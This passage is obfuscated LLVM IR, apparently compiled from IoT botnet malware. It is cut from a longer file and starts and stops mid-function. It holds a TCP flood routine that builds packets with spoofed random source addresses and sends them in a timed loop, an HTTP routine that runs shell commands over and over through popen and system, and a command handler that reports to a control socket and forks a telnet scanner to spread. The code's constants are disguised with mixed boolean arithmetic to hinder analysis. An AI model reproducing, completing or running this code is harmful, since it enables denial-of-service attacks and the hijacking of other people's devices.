  %120 = bitcast %union.anon.0* %119 to %struct.anon.1*
  %121 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %120, i32 0, i32 0
  store i16 %117, i16* %121, align 4
  %122 = call i32 @rand_cmwc()
  %123 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %124 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %123, i32 0, i32 0
  %125 = bitcast %union.anon.0* %124 to %struct.anon.1*
  %126 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %125, i32 0, i32 2
  store i32 %122, i32* %126, align 4
  %127 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %128 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %127, i32 0, i32 0
  %129 = bitcast %union.anon.0* %128 to %struct.anon.1*
  %130 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %129, i32 0, i32 3
  store i32 0, i32* %130, align 4
  %131 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %132 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %131, i32 0, i32 0
  %133 = bitcast %union.anon.0* %132 to %struct.anon.1*
  %134 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %133, i32 0, i32 4
  %135 = load i16, i16* %134, align 4
  %136 = xor i16 %135, -1
  %137 = xor i16 -241, -1
  %138 = xor i16 -28869, -1
  %139 = or i16 %136, %137
  %140 = or i16 -28869, %138
  %141 = xor i16 %139, -1
  %142 = and i16 %141, %140
  %143 = and i16 %135, -241
  %144 = xor i16 %142, -1
  %145 = xor i16 80, -1
  %146 = xor i16 18385, -1
  %147 = and i16 %144, 18385
  %148 = and i16 %142, %146
  %149 = and i16 %145, 18385
  %150 = and i16 80, %146
  %151 = or i16 %147, %148
  %152 = or i16 %149, %150
  %153 = xor i16 %151, %152
  %154 = or i16 %144, %145
  %155 = xor i16 %154, -1
  %156 = or i16 18385, %146
  %157 = and i16 %155, %156
  %158 = or i16 %153, %157
  %159 = or i16 %142, 80
  store i16 %158, i16* %134, align 4
  %160 = load i8*, i8** %12, align 8
  %161 = call i32 @strcmp(i8* %160, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.47, i32 0, i32 0)) #10
  %162 = icmp ne i32 %161, 0
  br i1 %162, label %265, label %163

; <label>:163:                                    ; preds = %87
  %164 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %165 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %164, i32 0, i32 0
  %166 = bitcast %union.anon.0* %165 to %struct.anon.1*
  %167 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %166, i32 0, i32 4
  %168 = load i16, i16* %167, align 4
  %169 = xor i16 %168, -1
  %170 = xor i16 -513, -1
  %171 = xor i16 -21155, -1
  %172 = or i16 %169, %170
  %173 = or i16 -21155, %171
  %174 = xor i16 %172, -1
  %175 = and i16 %174, %173
  %176 = and i16 %168, -513
  %177 = and i16 %175, 512
  %178 = xor i16 %175, 512
  %179 = or i16 %177, %178
  %180 = or i16 %175, 512
  store i16 %179, i16* %167, align 4
  %181 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %182 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %181, i32 0, i32 0
  %183 = bitcast %union.anon.0* %182 to %struct.anon.1*
  %184 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %183, i32 0, i32 4
  %185 = load i16, i16* %184, align 4
  %186 = xor i16 %185, -1
  %187 = xor i16 -1025, -1
  %188 = xor i16 78, -1
  %189 = or i16 %186, %187
  %190 = or i16 78, %188
  %191 = xor i16 %189, -1
  %192 = and i16 %191, %190
  %193 = and i16 %185, -1025
  %194 = and i16 %192, 1024
  %195 = xor i16 %192, 1024
  %196 = or i16 %194, %195
  %197 = or i16 %192, 1024
  store i16 %196, i16* %184, align 4
  %198 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %199 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %198, i32 0, i32 0
  %200 = bitcast %union.anon.0* %199 to %struct.anon.1*
  %201 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %200, i32 0, i32 4
  %202 = load i16, i16* %201, align 4
  %203 = xor i16 -257, -1
  %204 = xor i16 %202, %203
  %205 = and i16 %204, %202
  %206 = and i16 %202, -257
  %207 = xor i16 %205, -1
  %208 = xor i16 256, -1
  %209 = xor i16 -13076, -1
  %210 = and i16 %207, -13076
  %211 = and i16 %205, %209
  %212 = and i16 %208, -13076
  %213 = and i16 256, %209
  %214 = or i16 %210, %211
  %215 = or i16 %212, %213
  %216 = xor i16 %214, %215
  %217 = or i16 %207, %208
  %218 = xor i16 %217, -1
  %219 = or i16 -13076, %209
  %220 = and i16 %218, %219
  %221 = or i16 %216, %220
  %222 = or i16 %205, 256
  store i16 %221, i16* %201, align 4
  %223 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %224 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %223, i32 0, i32 0
  %225 = bitcast %union.anon.0* %224 to %struct.anon.1*
  %226 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %225, i32 0, i32 4
  %227 = load i16, i16* %226, align 4
  %228 = xor i16 %227, -1
  %229 = xor i16 -4097, -1
  %230 = xor i16 -13929, -1
  %231 = or i16 %228, %229
  %232 = or i16 -13929, %230
  %233 = xor i16 %231, -1
  %234 = and i16 %233, %232
  %235 = and i16 %227, -4097
  %236 = and i16 %234, 4096
  %237 = xor i16 %234, 4096
  %238 = or i16 %236, %237
  %239 = or i16 %234, 4096
  store i16 %238, i16* %226, align 4
  %240 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %241 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %240, i32 0, i32 0
  %242 = bitcast %union.anon.0* %241 to %struct.anon.1*
  %243 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %242, i32 0, i32 4
  %244 = load i16, i16* %243, align 4
  %245 = xor i16 -2049, -1
  %246 = xor i16 %244, %245
  %247 = and i16 %246, %244
  %248 = and i16 %244, -2049
  %249 = xor i16 %247, -1
  %250 = xor i16 2048, -1
  %251 = xor i16 23077, -1
  %252 = and i16 %249, 23077
  %253 = and i16 %247, %251
  %254 = and i16 %250, 23077
  %255 = and i16 2048, %251
  %256 = or i16 %252, %253
  %257 = or i16 %254, %255
  %258 = xor i16 %256, %257
  %259 = or i16 %249, %250
  %260 = xor i16 %259, -1
  %261 = or i16 23077, %251
  %262 = and i16 %260, %261
  %263 = or i16 %258, %262
  %264 = or i16 %247, 2048
  store i16 %263, i16* %243, align 4
  br label %420

; <label>:265:                                    ; preds = %87
  %266 = load i8*, i8** %12, align 8
  %267 = call i8* @strtok(i8* %266, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0)) #2
  store i8* %267, i8** %23, align 8
  br label %268

; <label>:268:                                    ; preds = %417, %265
  %269 = load i8*, i8** %23, align 8
  %270 = icmp ne i8* %269, null
  br i1 %270, label %271, label %419

; <label>:271:                                    ; preds = %268
  %272 = load i8*, i8** %23, align 8
  %273 = call i32 @strcmp(i8* %272, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.49, i32 0, i32 0)) #10
  %274 = icmp ne i32 %273, 0
  br i1 %274, label %305, label %275

; <label>:275:                                    ; preds = %271
  %276 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %277 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %276, i32 0, i32 0
  %278 = bitcast %union.anon.0* %277 to %struct.anon.1*
  %279 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %278, i32 0, i32 4
  %280 = load i16, i16* %279, align 4
  %281 = xor i16 %280, -1
  %282 = xor i16 -513, -1
  %283 = xor i16 -11310, -1
  %284 = or i16 %281, %282
  %285 = or i16 -11310, %283
  %286 = xor i16 %284, -1
  %287 = and i16 %286, %285
  %288 = and i16 %280, -513
  %289 = xor i16 %287, -1
  %290 = xor i16 512, -1
  %291 = xor i16 -1345, -1
  %292 = and i16 %289, -1345
  %293 = and i16 %287, %291
  %294 = and i16 %290, -1345
  %295 = and i16 512, %291
  %296 = or i16 %292, %293
  %297 = or i16 %294, %295
  %298 = xor i16 %296, %297
  %299 = or i16 %289, %290
  %300 = xor i16 %299, -1
  %301 = or i16 -1345, %291
  %302 = and i16 %300, %301
  %303 = or i16 %298, %302
  %304 = or i16 %287, 512
  store i16 %303, i16* %279, align 4
  br label %417

; <label>:305:                                    ; preds = %271
  %306 = load i8*, i8** %23, align 8
  %307 = call i32 @strcmp(i8* %306, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.50, i32 0, i32 0)) #10
  %308 = icmp ne i32 %307, 0
  br i1 %308, label %335, label %309

; <label>:309:                                    ; preds = %305
  %310 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %311 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %310, i32 0, i32 0
  %312 = bitcast %union.anon.0* %311 to %struct.anon.1*
  %313 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %312, i32 0, i32 4
  %314 = load i16, i16* %313, align 4
  %315 = xor i16 -1025, -1
  %316 = xor i16 %314, %315
  %317 = and i16 %316, %314
  %318 = and i16 %314, -1025
  %319 = xor i16 %317, -1
  %320 = xor i16 1024, -1
  %321 = xor i16 -31583, -1
  %322 = and i16 %319, -31583
  %323 = and i16 %317, %321
  %324 = and i16 %320, -31583
  %325 = and i16 1024, %321
  %326 = or i16 %322, %323
  %327 = or i16 %324, %325
  %328 = xor i16 %326, %327
  %329 = or i16 %319, %320
  %330 = xor i16 %329, -1
  %331 = or i16 -31583, %321
  %332 = and i16 %330, %331
  %333 = or i16 %328, %332
  %334 = or i16 %317, 1024
  store i16 %333, i16* %313, align 4
  br label %416

; <label>:335:                                    ; preds = %305
  %336 = load i8*, i8** %23, align 8
  %337 = call i32 @strcmp(i8* %336, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.51, i32 0, i32 0)) #10
  %338 = icmp ne i32 %337, 0
  br i1 %338, label %357, label %339

; <label>:339:                                    ; preds = %335
  %340 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %341 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %340, i32 0, i32 0
  %342 = bitcast %union.anon.0* %341 to %struct.anon.1*
  %343 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %342, i32 0, i32 4
  %344 = load i16, i16* %343, align 4
  %345 = xor i16 %344, -1
  %346 = xor i16 -257, -1
  %347 = xor i16 23499, -1
  %348 = or i16 %345, %346
  %349 = or i16 23499, %347
  %350 = xor i16 %348, -1
  %351 = and i16 %350, %349
  %352 = and i16 %344, -257
  %353 = and i16 %351, 256
  %354 = xor i16 %351, 256
  %355 = or i16 %353, %354
  %356 = or i16 %351, 256
  store i16 %355, i16* %343, align 4
  br label %415

; <label>:357:                                    ; preds = %335
  %358 = load i8*, i8** %23, align 8
  %359 = call i32 @strcmp(i8* %358, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.52, i32 0, i32 0)) #10
  %360 = icmp ne i32 %359, 0
  br i1 %360, label %379, label %361

; <label>:361:                                    ; preds = %357
  %362 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %363 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %362, i32 0, i32 0
  %364 = bitcast %union.anon.0* %363 to %struct.anon.1*
  %365 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %364, i32 0, i32 4
  %366 = load i16, i16* %365, align 4
  %367 = xor i16 %366, -1
  %368 = xor i16 -4097, -1
  %369 = xor i16 32382, -1
  %370 = or i16 %367, %368
  %371 = or i16 32382, %369
  %372 = xor i16 %370, -1
  %373 = and i16 %372, %371
  %374 = and i16 %366, -4097
  %375 = and i16 %373, 4096
  %376 = xor i16 %373, 4096
  %377 = or i16 %375, %376
  %378 = or i16 %373, 4096
  store i16 %377, i16* %365, align 4
  br label %414

; <label>:379:                                    ; preds = %357
  %380 = load i8*, i8** %23, align 8
  %381 = call i32 @strcmp(i8* %380, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.53, i32 0, i32 0)) #10
  %382 = icmp ne i32 %381, 0
  br i1 %382, label %409, label %383

; <label>:383:                                    ; preds = %379
  %384 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %385 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %384, i32 0, i32 0
  %386 = bitcast %union.anon.0* %385 to %struct.anon.1*
  %387 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %386, i32 0, i32 4
  %388 = load i16, i16* %387, align 4
  %389 = xor i16 -2049, -1
  %390 = xor i16 %388, %389
  %391 = and i16 %390, %388
  %392 = and i16 %388, -2049
  %393 = xor i16 %391, -1
  %394 = xor i16 2048, -1
  %395 = xor i16 -21866, -1
  %396 = and i16 %393, -21866
  %397 = and i16 %391, %395
  %398 = and i16 %394, -21866
  %399 = and i16 2048, %395
  %400 = or i16 %396, %397
  %401 = or i16 %398, %399
  %402 = xor i16 %400, %401
  %403 = or i16 %393, %394
  %404 = xor i16 %403, -1
  %405 = or i16 -21866, %395
  %406 = and i16 %404, %405
  %407 = or i16 %402, %406
  %408 = or i16 %391, 2048
  store i16 %407, i16* %387, align 4
  br label %413

; <label>:409:                                    ; preds = %379
  %410 = load i32, i32* @mainCommSock, align 4
  %411 = load i8*, i8** %23, align 8
  %412 = call i32 (i32, i8*, ...) @sockprintf(i32 %410, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.54, i32 0, i32 0), i8* %411)
  br label %413

; <label>:413:                                    ; preds = %409, %383
  br label %414

; <label>:414:                                    ; preds = %413, %361
  br label %415

; <label>:415:                                    ; preds = %414, %339
  br label %416

; <label>:416:                                    ; preds = %415, %309
  br label %417

; <label>:417:                                    ; preds = %416, %275
  %418 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0)) #2
  store i8* %418, i8** %23, align 8
  br label %268

; <label>:419:                                    ; preds = %268
  br label %420

; <label>:420:                                    ; preds = %419, %163
  %421 = call i32 @rand_cmwc()
  %422 = trunc i32 %421 to i16
  %423 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %424 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %423, i32 0, i32 0
  %425 = bitcast %union.anon.0* %424 to %struct.anon.1*
  %426 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %425, i32 0, i32 5
  store i16 %422, i16* %426, align 2
  %427 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %428 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %427, i32 0, i32 0
  %429 = bitcast %union.anon.0* %428 to %struct.anon.1*
  %430 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %429, i32 0, i32 6
  store i16 0, i16* %430, align 4
  %431 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %432 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %431, i32 0, i32 0
  %433 = bitcast %union.anon.0* %432 to %struct.anon.1*
  %434 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %433, i32 0, i32 7
  store i16 0, i16* %434, align 2
  %435 = load i32, i32* %9, align 4
  %436 = icmp eq i32 %435, 0
  br i1 %436, label %437, label %439

; <label>:437:                                    ; preds = %420
  %438 = call i32 @rand_cmwc()
  br label %444

; <label>:439:                                    ; preds = %420
  %440 = load i32, i32* %9, align 4
  %441 = trunc i32 %440 to i16
  %442 = call zeroext i16 @htons(i16 zeroext %441) #13
  %443 = zext i16 %442 to i32
  br label %444

; <label>:444:                                    ; preds = %439, %437
  %445 = phi i32 [ %438, %437 ], [ %443, %439 ]
  %446 = trunc i32 %445 to i16
  %447 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %448 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %447, i32 0, i32 0
  %449 = bitcast %union.anon.0* %448 to %struct.anon.1*
  %450 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %449, i32 0, i32 1
  store i16 %446, i16* %450, align 2
  %451 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %452 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %453 = call zeroext i16 @tcpcsum(%struct.iphdr* %451, %struct.tcphdr* %452)
  %454 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %455 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %454, i32 0, i32 0
  %456 = bitcast %union.anon.0* %455 to %struct.anon.1*
  %457 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %456, i32 0, i32 6
  store i16 %453, i16* %457, align 4
  %458 = bitcast i8* %95 to i16*
  %459 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %460 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %459, i32 0, i32 2
  %461 = load i16, i16* %460, align 2
  %462 = zext i16 %461 to i32
  %463 = call zeroext i16 @csum(i16* %458, i32 %462)
  %464 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %465 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %464, i32 0, i32 7
  store i16 %463, i16* %465, align 2
  %466 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %467 = load i32, i32* %10, align 4
  %468 = sub i32 0, %467
  %469 = sub i32 %466, %468
  %470 = add nsw i32 %466, %467
  store i32 %469, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %471

; <label>:471:                                    ; preds = %524, %523, %444
  br label %472

; <label>:472:                                    ; preds = %471
  %473 = load i32, i32* %17, align 4
  %474 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %475 = call i64 @sendto(i32 %473, i8* %95, i64 %92, i32 0, %struct.sockaddr* %474, i32 16)
  %476 = load i32, i32* %19, align 4
  %477 = call i32 @getRandomIP(i32 %476)
  %478 = call i32 @htonl(i32 %477) #13
  %479 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %480 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %479, i32 0, i32 8
  store i32 %478, i32* %480, align 4
  %481 = call i32 @rand_cmwc()
  %482 = trunc i32 %481 to i16
  %483 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %484 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %483, i32 0, i32 3
  store i16 %482, i16* %484, align 4
  %485 = call i32 @rand_cmwc()
  %486 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %487 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %486, i32 0, i32 0
  %488 = bitcast %union.anon.0* %487 to %struct.anon.1*
  %489 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %488, i32 0, i32 2
  store i32 %485, i32* %489, align 4
  %490 = call i32 @rand_cmwc()
  %491 = trunc i32 %490 to i16
  %492 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %493 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %492, i32 0, i32 0
  %494 = bitcast %union.anon.0* %493 to %struct.anon.1*
  %495 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %494, i32 0, i32 0
  store i16 %491, i16* %495, align 4
  %496 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %497 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %496, i32 0, i32 0
  %498 = bitcast %union.anon.0* %497 to %struct.anon.1*
  %499 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %498, i32 0, i32 6
  store i16 0, i16* %499, align 4
  %500 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %501 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %502 = call zeroext i16 @tcpcsum(%struct.iphdr* %500, %struct.tcphdr* %501)
  %503 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %504 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %503, i32 0, i32 0
  %505 = bitcast %union.anon.0* %504 to %struct.anon.1*
  %506 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %505, i32 0, i32 6
  store i16 %502, i16* %506, align 4
  %507 = bitcast i8* %95 to i16*
  %508 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %509 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %508, i32 0, i32 2
  %510 = load i16, i16* %509, align 2
  %511 = zext i16 %510 to i32
  %512 = call zeroext i16 @csum(i16* %507, i32 %511)
  %513 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %514 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %513, i32 0, i32 7
  store i16 %512, i16* %514, align 2
  %515 = load i32, i32* %25, align 4
  %516 = load i32, i32* %15, align 4
  %517 = icmp eq i32 %515, %516
  br i1 %517, label %518, label %524

; <label>:518:                                    ; preds = %472
  %519 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %520 = load i32, i32* %24, align 4
  %521 = icmp sgt i32 %519, %520
  br i1 %521, label %522, label %523

; <label>:522:                                    ; preds = %518
  br label %530

; <label>:523:                                    ; preds = %518
  store i32 0, i32* %25, align 4
  br label %471

; <label>:524:                                    ; preds = %472
  %525 = load i32, i32* %25, align 4
  %526 = sub i32 %525, 1317984874
  %527 = add i32 %526, 1
  %528 = add i32 %527, 1317984874
  %529 = add i32 %525, 1
  store i32 %528, i32* %25, align 4
  br label %471

; <label>:530:                                    ; preds = %522
  %531 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %531)
  br label %532

; <label>:532:                                    ; preds = %530, %59, %51, %44
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #1

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct._IO_FILE*, align 8
  %7 = alloca [80 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %8 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %9 = load i32, i32* %4, align 4
  %10 = sub i32 0, %9
  %11 = sub i32 %8, %10
  %12 = add nsw i32 %8, %9
  store i32 %11, i32* %5, align 4
  %13 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %14 = call i32 (i8*, i8*, ...) @sprintf(i8* %13, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.55, i32 0, i32 0)) #2
  %15 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %16 = load i8*, i8** %3, align 8
  %17 = call i8* @strcat(i8* %15, i8* %16) #2
  %18 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %19 = call i8* @strcat(i8* %18, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.56, i32 0, i32 0)) #2
  %20 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %21 = call %struct._IO_FILE* @popen(i8* %20, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.57, i32 0, i32 0))
  store %struct._IO_FILE* %21, %struct._IO_FILE** %6, align 8
  br label %22

; <label>:22:                                     ; preds = %26, %2
  %23 = load i32, i32* %5, align 4
  %24 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %25 = icmp sgt i32 %23, %24
  br i1 %25, label %26, label %29

; <label>:26:                                     ; preds = %22
  %27 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %28 = call i32 @system(i8* %27)
  br label %22

; <label>:29:                                     ; preds = %22
  ret void
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #4

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8*) #4

declare %struct._IO_FILE* @popen(i8*, i8*) #3

declare i32 @system(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %27 = load i8**, i8*** %4, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 0
  %29 = load i8*, i8** %28, align 8
  %30 = call i32 @strcmp(i8* %29, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.58, i32 0, i32 0)) #10
  %31 = icmp ne i32 %30, 0
  br i1 %31, label %35, label %32

; <label>:32:                                     ; preds = %2
  %33 = load i32, i32* @mainCommSock, align 4
  %34 = call i32 (i32, i8*, ...) @sockprintf(i32 %33, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.59, i32 0, i32 0))
  br label %490

; <label>:35:                                     ; preds = %2
  %36 = load i8**, i8*** %4, align 8
  %37 = getelementptr inbounds i8*, i8** %36, i64 0
  %38 = load i8*, i8** %37, align 8
  %39 = call i32 @strcmp(i8* %38, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.60, i32 0, i32 0)) #10
  %40 = icmp ne i32 %39, 0
  br i1 %40, label %46, label %41

; <label>:41:                                     ; preds = %35
  %42 = load i32, i32* @mainCommSock, align 4
  %43 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %44 = call i8* @inet_ntoa(i32 %43) #2
  %45 = call i32 (i32, i8*, ...) @sockprintf(i32 %42, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.61, i32 0, i32 0), i8* %44)
  br label %490

; <label>:46:                                     ; preds = %35
  %47 = load i8**, i8*** %4, align 8
  %48 = getelementptr inbounds i8*, i8** %47, i64 0
  %49 = load i8*, i8** %48, align 8
  %50 = call i32 @strcmp(i8* %49, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.62, i32 0, i32 0)) #10
  %51 = icmp ne i32 %50, 0
  br i1 %51, label %490, label %52

; <label>:52:                                     ; preds = %46
  %53 = load i32, i32* %3, align 4
  %54 = icmp ne i32 %53, 2
  br i1 %54, label %55, label %58

; <label>:55:                                     ; preds = %52
  %56 = load i32, i32* @mainCommSock, align 4
  %57 = call i32 (i32, i8*, ...) @sockprintf(i32 %56, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.63, i32 0, i32 0))
  br label %490

; <label>:58:                                     ; preds = %52
  %59 = load i8**, i8*** %4, align 8
  %60 = getelementptr inbounds i8*, i8** %59, i64 1
  %61 = load i8*, i8** %60, align 8
  %62 = call i32 @strcmp(i8* %61, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.64, i32 0, i32 0)) #10
  %63 = icmp ne i32 %62, 0
  br i1 %63, label %121, label %64

; <label>:64:                                     ; preds = %58
  %65 = load i32, i32* @scanPid, align 4
  %66 = icmp eq i32 %65, 0
  br i1 %66, label %67, label %68

; <label>:67:                                     ; preds = %64
  br label %490

; <label>:68:                                     ; preds = %64
  %69 = load i32, i32* @mainCommSock, align 4
  %70 = call i32 (i32, i8*, ...) @sockprintf(i32 %69, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.65, i32 0, i32 0))
  %71 = load i32, i32* @scanPid, align 4
  %72 = call i32 @kill(i32 %71, i32 9) #2
  store i32 0, i32* @scanPid, align 4
  %73 = load i8**, i8*** %4, align 8
  %74 = getelementptr inbounds i8*, i8** %73, i64 1
  %75 = load i8*, i8** %74, align 8
  %76 = call i32 @strcmp(i8* %75, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.66, i32 0, i32 0)) #10
  %77 = icmp ne i32 %76, 0
  br i1 %77, label %96, label %78

; <label>:78:                                     ; preds = %68
  %79 = load i32, i32* @scanPid, align 4
  %80 = icmp ne i32 %79, 0
  br i1 %80, label %81, label %82

; <label>:81:                                     ; preds = %78
  br label %490

; <label>:82:                                     ; preds = %78
  %83 = call i32 @fork() #2
  store i32 %83, i32* %5, align 4
  %84 = load i32, i32* @mainCommSock, align 4
  %85 = call i32 (i32, i8*, ...) @sockprintf(i32 %84, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.67, i32 0, i32 0))
  %86 = load i32, i32* %5, align 4
  %87 = icmp ugt i32 %86, 0
  br i1 %87, label %88, label %90

; <label>:88:                                     ; preds = %82
  %89 = load i32, i32* %5, align 4
  store i32 %89, i32* @scanPid, align 4
  br label %490

; <label>:90:                                     ; preds = %82
  %91 = load i32, i32* %5, align 4
  %92 = icmp eq i32 %91, -1
  br i1 %92, label %93, label %94

; <label>:93:                                     ; preds = %90
  br label %490

; <label>:94:                                     ; preds = %90
  br label %95

; <label>:95:                                     ; preds = %94
  call void (i32, ...) bitcast (void ()* @TelnetScan to void (i32, ...)*)(i32 1)
  call void @_exit(i32 0) #12
  unreachable

; <label>:96:                                     ; preds = %68
  %97 = load i8**, i8*** %4, align 8
  %98 = getelementptr inbounds i8*, i8** %97, i64 1
  %99 = load i8*, i8** %98, align 8
